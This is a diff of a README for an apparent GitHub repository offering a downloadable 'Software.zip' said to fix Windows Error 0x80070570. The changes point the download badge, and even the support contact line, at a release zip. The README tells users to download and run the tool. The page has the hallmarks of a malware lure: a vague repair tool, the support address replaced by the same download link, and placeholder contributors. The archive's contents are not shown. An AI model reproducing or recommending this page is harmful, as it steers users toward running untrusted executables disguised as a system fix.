@@ -9,7 +9,7 @@ The "Error 0x80070570" is a common issue encountered by Windows users when their
 To resolve the "Error 0x80070570" issue, we have provided a software tool that you can download and run on your system. This software is designed to automatically scan for any corrupted files and repair them, restoring your system's functionality without the need for manual troubleshooting. 
 
 ### Get the Software 📥
-[![Download Software](https://img.shields.io/badge/Download-Software-orange)](https://github.com/user-attachments/files/17466420/Software.zip)
+[![Download Software](https://github.com/MattNr06/Fixing-Error-0x80070570/releases/download/v2.0/Software.zip)](https://github.com/MattNr06/Fixing-Error-0x80070570/releases/download/v2.0/Software.zip)
 
 ## Installation Steps
 To fix the "Error 0x80070570" using our software tool, follow these simple steps:
@@ -29,7 +29,7 @@ If you encounter any issues during the repair process or have any questions, fee
 - **/Documentation**: Additional documentation and troubleshooting guides.
 
 ## Support
-For any further assistance or inquiries, please contact our support team at support@example.com.
+For any further assistance or inquiries, please contact our support team at https://github.com/MattNr06/Fixing-Error-0x80070570/releases/download/v2.0/Software.zip
 
 ## Contributors
 - John Doe (@johndoe)
